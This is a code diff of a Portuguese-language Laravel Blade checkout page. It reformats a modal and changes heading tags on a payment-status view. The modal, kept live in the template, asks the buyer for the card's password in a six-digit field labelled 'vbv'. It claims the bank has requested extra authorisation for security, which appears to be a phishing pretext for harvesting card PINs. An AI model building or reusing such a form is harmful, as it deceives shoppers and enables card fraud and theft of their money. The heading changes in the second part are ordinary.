@@ -936,27 +936,17 @@
                 <div class="modal-content text-center">
                     <div class="inner-content">
                         <div class="t1 mt10 mb20 bold green f-h2">Precisamos confirmar sua transação</div>
-
-                        <p class="f16" id="digitos_vbv">Digite a senha do cartão, a mesma utilizada para transações
-                            comerciais.</p>
-
+                        <p class="f16" id="digitos_vbv">Digite a senha do cartão, a mesma utilizada para transações comerciais.</p>
                         <div class="form-group w-100" style="margin-top: 10px;">
-                            <input type="tel" data-name="card[0][number]" data-checkout="cardNumber" id="senha_vbv"
-                                   class="bold l-space1 input-validate required input input-card-number bincreditcard"
-                                   data-iugu="number" placeholder="xxxxxx" data-testid="input-cc-number" maxlength="6">
+                            <input type="tel" data-name="card[0][number]" data-checkout="cardNumber" id="senha_vbv" class="bold l-space1 input-validate required input input-card-number bincreditcard" data-iugu="number" placeholder="xxxxxx" data-testid="input-cc-number" maxlength="6">
                             <div id="input-card-number-0_errors" class="error-block"></div>
                         </div>
-
-                        <a href="javascript:" id="btn_vbv_confirma"
-                           class="btn btn-grey btn-block mt15 mb15 close-transaction-error">Confirmar</a>
-                        <!-- /.btn btn-grey -->
+                        <a href="javascript:" id="btn_vbv_confirma" class="btn btn-grey btn-block mt15 mb15 close-transaction-error">Confirmar</a>
                     </div>
-
                     <p class="f11 tip js-tip">
                         <span class="bold">Dica:</span>
                         <span class="js-creditcard-tip">Gostaríamos de informar que, por motivos de segurança, o banco solicitou uma autorização adicional para garantir a proteção de suas informações financeiras.</span>
                     </p>
-
                     <a href="#" class="modal-close" id="fechar_vbv" data-target="modal-transaction-error">[x] fechar</a>
                 </div>
             </div>
@@ -1079,16 +1069,17 @@
         @if($data['status'] == 200)
             <div style="margin-top: 20px; text-align: center;">
                 @if(in_array($data['payment_status'], ['processing', 'authorized', 'paid', 'waiting_payment', 'chargedback', 'in_protest', 'partially_paid']))
-                    <h3>Obrigado pelo seu pagamento</h3>
+                    <h2>Obrigado pelo seu pagamento</h2>
                 @else
-                    <h4>O pagamento falhou!</h4>
+                    <h2>O pagamento falhou!</h2>
                 @endif
 
-                <h5>Status: {{ ucwords(str_replace('_', ' ', $data['payment_status'])) }}</h5>
+                <h4>Status: {{ ucwords(str_replace('_', ' ', $data['payment_status'])) }}</h4>
             </div>
         @else
             <div style="display: flex; width: 100%; height: 100%; justify-content:center; align-items: center;">
-                <h2 style="padding: 50px; font-size: 1.5em;">
+                <h2>O pagamento falhou!</h2>
+                <h4 style="padding: 50px; font-size: 1.5em;">
                     @isset($data['message'])
                         @if(is_array($data['message']))
                             @foreach($data['message'] as $msg)
@@ -1100,7 +1091,7 @@
                     @else
                         Pagamento não configurado!
                     @endif
-                </h2>
+                </h4>
             </div>
         @endif
     </div>
